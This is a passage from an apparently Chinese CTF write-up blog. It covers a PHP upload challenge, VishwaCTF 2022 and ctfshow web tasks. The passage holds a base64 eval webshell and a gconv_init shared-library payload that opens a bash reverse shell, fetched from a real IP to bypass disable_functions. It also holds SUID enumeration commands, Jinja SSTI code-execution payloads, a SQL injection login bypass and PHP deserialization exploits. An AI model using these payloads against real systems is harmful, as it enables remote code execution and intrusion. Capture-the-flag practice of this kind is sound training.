Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看大佬博客学到两种方法<br>一、利用 include+php伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbIjEiXSk7Pz4=</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1mM2I5NGU4OGJkMWJkMzI1YWY2ZjYyODI4Yzg3ODVkZC5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以<br><img src="https://img-blog.csdnimg.cn/885139b1c44548759e40df276313be3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>之后bypass<br>通过move_uploaded_file()函数上传exp.so和gconv-modules，实现bypass disable_functions<br>paylaod.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译成so文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure>
<p>gconv-modules<br>通用模板</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  自定义字符集名字（大写）<span class="comment">//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span></span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）<span class="comment">//    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD<span class="comment">//    INTERNAL    ../../../../../../../../tmp/payload    2</span></span><br><span class="line">module  INTERNAL   PAYLOAD<span class="comment">//    ../../../../../../../../tmp/payload    2</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8669#toc-0">原理</a><br>用 SplFileObject 写 payload.so 和 gconv-modules</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://124.222.115.141:80/payload.so&quot;</span>;</span><br><span class="line"><span class="comment">//$url = &quot;http://124.222.115.141:80/gconv-modules&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file1</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(!<span class="variable">$file1</span>-&gt;eof())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$file1</span>-&gt;fgets();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file2</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/payload.so&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="comment">//$file2 = new SplFileObject(&#x27;/tmp/gconv-modules&#x27;,&#x27;w&#x27;);</span></span><br><span class="line"><span class="variable">$file2</span>-&gt;fwrite(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/77552e4fedae45288b5ce4ff93e43e17.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>触发</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);show_source(<span class="string">&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d1e160f038514860ae508d018019c68b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>提权<br>尝试suid提权</p>
<blockquote>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find /bin -perm -u=s -type f 2&gt;/dev/null<br>find /usr -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/916dc88975be41a59810f40aada1b41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/24/VishwaCTF%202022/">VishwaCTF 2022</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-24</time><div class="content"><h2 id="Hey-Buddy"><a href="#Hey-Buddy" class="headerlink" title="Hey Buddy!"></a>Hey Buddy!</h2><p>考察ssti，先利用链子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>发现<br><img src="https://img-blog.csdnimg.cn/a81cb17995234d818565aa3f335558ab.png"><br>之后再利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">99</span>](path=%<span class="number">27</span>%<span class="number">27</span>,fullname=%<span class="number">27</span>%<span class="number">27</span>).get_data(%<span class="number">27</span>./flag.txt%<span class="number">27</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/ceeefe73b21f41939348fc753332a278.png"></p>
<h2 id="My-Useless-Website"><a href="#My-Useless-Website" class="headerlink" title="My Useless Website"></a>My Useless Website</h2><p>直接万能密码<br>1’ or 1=1 – +</p>
<h2 id="Stock-Bot"><a href="#Stock-Bot" class="headerlink" title="Stock Bot"></a>Stock Bot</h2><p>看源码发现<br><img src="https://img-blog.csdnimg.cn/c6c5056108274cf18d9b085d94a02869.png"><br>访问后发现file_get_contents函数<br>之后猜一下flag，由于源码有Flag<br>直接包含Flag得到<br><img src="https://img-blog.csdnimg.cn/129acfa2bd864d03ae3c93e7172bb131.png"></p>
<h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>看源码，发现<br><img src="https://img-blog.csdnimg.cn/a9f07eb97ea54d82b237aac3e881524e.png"><br>访问的到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> ShowSource();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$todos</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = substr(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="variable">$m</span> = substr(<span class="variable">$c</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = unserialize(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = serialize(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = sha1(<span class="variable">$m</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>经分析（分析有点’乱‘），得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source= <span class="string">&#x27;/opt/app-root/src/flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$todos</span>[] = <span class="keyword">new</span> ShowSource();</span><br><span class="line"><span class="keyword">echo</span> sha1(serialize(<span class="variable">$todos</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$todos</span>));</span><br></pre></td></tr></table></figure>
<p>将todos放入cookie得到flag</p>
<h2 id="Strong-Encryption"><a href="#Strong-Encryption" class="headerlink" title="Strong Encryption"></a>Strong Encryption</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decrypt -&gt; 576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$enKey</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$strHex</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$Key</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$rKey</span>=<span class="number">69</span>;</span><br><span class="line">        <span class="variable">$tmpKey</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$enKey</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$Key</span>.=ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>;</span><br><span class="line">            <span class="variable">$tmpKey</span>.=chr(ord(<span class="variable">$enKey</span>[<span class="variable">$i</span>])+<span class="variable">$rKey</span>);</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$rKeyHex</span>=dechex(<span class="variable">$rKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$enKeyHash</span> = hash(<span class="string">&#x27;sha256&#x27;</span>,<span class="variable">$tmpKey</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line">                <span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$strHex</span> .= dechex(ord(<span class="variable">$str</span>[<span class="variable">$i</span>])+<span class="variable">$Key</span>[<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$encTxt</span> = <span class="variable">$strHex</span>.<span class="variable">$rKeyHex</span>.<span class="variable">$enKeyHash</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$encTxt</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$encTxt</span> = encrypt(<span class="variable">$flag</span>, <span class="string">&quot;VishwaCTF&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$encTxt</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解密脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982&quot;</span>;</span><br><span class="line"><span class="variable">$Key</span>=<span class="string">&#x27;155174184173188166136153139&#x27;</span>;   </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str2</span>); <span class="variable">$i</span>++,<span class="variable">$j</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>==strlen(<span class="variable">$Key</span>))&#123;</span><br><span class="line">			<span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$str2</span>[<span class="variable">$i</span>].<span class="variable">$str2</span>[<span class="variable">$i</span>+<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$flag</span> .= chr(hexdec(<span class="variable">$a</span>)-<span class="variable">$Key</span>[<span class="variable">$j</span>]);  </span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Keep-Your-Secrets"><a href="#Keep-Your-Secrets" class="headerlink" title="Keep Your Secrets"></a>Keep Your Secrets</h2><p>进入题目，然后进行注册，发现出现jwt<br><img src="https://img-blog.csdnimg.cn/1f673019cf31480680509bc57b15e6b1.png"></p>
<p>jwt解密，并修改权限为admin<br>密码利用脚本爆破（owasp）<br>（虽然我的字典没有这个密码！！）<br>之后加入token到header中<br><img src="https://img-blog.csdnimg.cn/0b24261f6a814cba956d80f33f4b329c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h2 id="Request-Me-FLAG"><a href="#Request-Me-FLAG" class="headerlink" title="Request Me FLAG"></a>Request Me FLAG</h2><p>进入题目，看提示发现让修改请求方式<br>修改得到<br><img src="https://img-blog.csdnimg.cn/3d3f75bd75064282ac3ee875fe8c2b87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/09/ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF/">ctfshow 卷王杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-09</time><div class="content"><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>看源码<br><img src="https://img-blog.csdnimg.cn/f106b99be0794b28b45fc1535910d65c.png" alt="在这里插入图片描述"><br>进入题目<br><img src="https://img-blog.csdnimg.cn/2cfca4ce29aa4da7bbfcc45f2b656092.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到题目想到内置类<br>利用数组溢出绕过c<br>再利用内置类得到flag<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">FilesystemIterator</span>&amp;b=/<span class="keyword">var</span>/www/html&amp;c=<span class="number">9223372036854775806</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过该函数找到文件夹<br><img src="https://img-blog.csdnimg.cn/96d34e7f7be14299bba8f790caadc5fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c=<span class="number">9223372036854775806</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy unserialize"></a>easy unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        array_walk(<span class="keyword">$this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$fn</span>, <span class="variable">$prev</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="keyword">$this</span>-&gt;object-&gt;add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;object-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        call_user_func([<span class="keyword">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;高一新生报道&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看这位师傅写的博客，比较详细<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/not_code_god/article/details/123170171?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164604602616780271936202%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164604602616780271936202&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123170171.pc_search_result_control_group&utm_term=ctfshow%20%E5%8D%B7%E7%8E%8B%E6%9D%AF&spm=1018.2226.3001.4187">大佬博客</a><br>最后的exp为</p>
